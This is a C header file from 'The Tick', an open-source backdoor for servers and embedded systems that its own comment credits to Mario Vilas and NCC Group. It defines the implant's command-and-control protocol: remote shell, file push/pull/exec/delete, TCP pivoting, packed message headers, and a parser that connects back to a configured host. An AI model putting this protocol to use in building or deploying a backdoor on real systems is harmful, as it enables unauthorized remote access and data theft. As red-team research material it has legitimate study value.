/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#ifndef PARSER_H
#define PARSER_H

#include "common.h"
#include "config.h"

#if TICK_FEATURES_CRYPTO
#include "ssl.h"
#endif

// Base command IDs per category.
#define BASE_CMD_SYSTEM         0x0000
#define BASE_CMD_FILE           0x0100
#define BASE_CMD_NET            0x0200

// No operation command.
#define CMD_NOP                 0xFFFF

// System commands.
#define CMD_SYSTEM_EXIT         BASE_CMD_SYSTEM + 0
#define CMD_SYSTEM_FORK         BASE_CMD_SYSTEM + 1
#define CMD_SYSTEM_SHELL        BASE_CMD_SYSTEM + 2

// File commands.
#define CMD_FILE_PULL           BASE_CMD_FILE + 0       // formerly CMD_FILE_READ
#define CMD_FILE_PUSH           BASE_CMD_FILE + 1       // formerly CMD_FILE_WRITE
#define CMD_FILE_UNLINK         BASE_CMD_FILE + 2       // formerly CMD_FILE_DELETE
#define CMD_FILE_EXEC           BASE_CMD_FILE + 3
#define CMD_FILE_CHMOD          BASE_CMD_FILE + 4
#define CMD_FILE_OPEN           BASE_CMD_FILE + 5       // the following were added in v0.2
#define CMD_FILE_READ           BASE_CMD_FILE + 6
#define CMD_FILE_WRITE          BASE_CMD_FILE + 7
#define CMD_FILE_STAT           BASE_CMD_FILE + 8
#define CMD_FILE_READDIR        BASE_CMD_FILE + 9
#define CMD_FILE_READLINK       BASE_CMD_FILE + 10
#define CMD_FILE_SYMLINK        BASE_CMD_FILE + 11
#define CMD_FILE_LINK           BASE_CMD_FILE + 12
#define CMD_FILE_RMDIR          BASE_CMD_FILE + 13
#define CMD_FILE_MKDIR          BASE_CMD_FILE + 14
#define CMD_FILE_CHOWN          BASE_CMD_FILE + 15
#define CMD_FILE_ACCESS         BASE_CMD_FILE + 16
#define CMD_FILE_STATVFS        BASE_CMD_FILE + 17
#define CMD_FILE_TRUNCATE       BASE_CMD_FILE + 18

// Network commands.
//#define CMD_HTTP_DOWNLOAD       BASE_CMD_NET + 0        // deprecated in v0.2
#define CMD_DNS_RESOLVE         BASE_CMD_NET + 1
#define CMD_TCP_PIVOT           BASE_CMD_NET + 2

// Command header.
#pragma pack(push, 1)
typedef struct              // (all values below in network byte order)
{
    uint16_t cmd_id;        // Command ID
    uint16_t cmd_len;       // Small data size, to be read in memory while parsing
    uint32_t data_len;      // Big data size, to be read by command implementations
} CMD_HEADER;
#pragma pack(pop)

// Response codes.
#define CMD_STATUS_OK      0x00
#define CMD_STATUS_ERROR   0xFF

// Response header.
#pragma pack(push, 1)
typedef struct              // (all values below in network byte order)
{
    uint8_t  status;        // Status code (OK or ERROR)
    uint32_t data_len;      // Big data size
} RESP_HEADER;
#pragma pack(pop)

// TCP pivot structure. Only IPv4 is supported.
#pragma pack(push, 1)
typedef struct              // (all values below in network byte order)
{
    uint32_t ip;            // IP address to connect to
    uint16_t port;          // TCP port to connect to
    uint16_t from_port;     // Optional TCP port to connect from
} CMD_TCP_PIVOT_ARGS;
#pragma pack(pop)

// Stat structure for the file API.
// Unsupported fields will be set to 0.
#pragma pack(push, 1)
typedef struct
{
    uint64_t     dev;   // ID of device containing file
    uint64_t     ino;   // inode number
    uint64_t    mode;   // protection
    uint64_t   nlink;   // number of hard links
    uint64_t     uid;   // user ID of owner
    uint64_t     gid;   // group ID of owner
    uint64_t     rdev;  // device ID (if special file)
    uint64_t     size;  // total size, in bytes
    uint64_t blksize;   // blocksize for file system I/O
    uint64_t  blocks;   // number of 512B blocks allocated
    uint64_t    atime;  // time of last access
    uint64_t    mtime;  // time of last modification
    uint64_t    ctime;  // time of last status change
} RESP_FILE_STAT;
#pragma pack(pop)

// Statvfs structure for the file API.
// Unsupported fields will be set to 0.
#pragma pack(push, 1)
typedef struct
{
    uint64_t f_type;        // Type of filesystem
    uint64_t f_bsize;       // Optimal transfer block size
    uint64_t f_blocks;      // Total data blocks in filesystem
    uint64_t f_bfree;       // Free blocks in filesystem
    uint64_t f_bavail;      // Free blocks available to unprivileged user
    uint64_t f_files;       // Total inodes in filesystem
    uint64_t f_ffree;       // Free inodes in filesystem
    uint64_t f_fsid[2];     // Filesystem ID
    uint64_t f_namelen;     // Maximum length of filenames (optional)
    uint64_t f_frsize;      // Fragment size (optional)
    uint64_t f_flags;       // Mount flags of filesystem (optional)
} RESP_FILE_STATVFS;
#pragma pack(pop)

// Parser class definition.
typedef struct
{
    char uuid[16];
    char hostname[64];
    int port;
    int fd;
#if TICK_FEATURES_TIME_LIMIT
    time_t start_time;
    time_t end_time;
#endif
#if TICK_FEATURES_CRYPTO
    int use_ssl;
    SSL_Context ssl;
#endif
    CMD_HEADER header;
    char buffer[TICK_PARSER_BUFFER_SIZE];
} Parser;

// Helper functions.
int is_empty(const char *buffer, size_t size);

// Parser methods.
void parser_init(Parser *parser, const Settings *settings);
void parser_close(Parser *parser);
void parser_begin_response(Parser *parser, uint8_t status, uint32_t length);
void parser_ok(Parser *parser);
void parser_error(Parser *parser, const char *error);
int parser_is_connected(Parser *parser);
void parser_connect(Parser *parser);
void parser_wait(Parser *parser);
void parser_next(Parser *parser);
int parser_get_first_arg(Parser *parser);
int parser_get_second_arg(Parser *parser);
int parser_read_first_arg(Parser *parser, char *buffer, size_t count);
int parser_read_second_arg(Parser *parser, char *buffer, size_t count);
int parser_send_block(Parser *parser, const char *buf, size_t count);
int parser_recv_block(Parser *parser, char *buf, size_t count);

#endif /* PARSER_H */
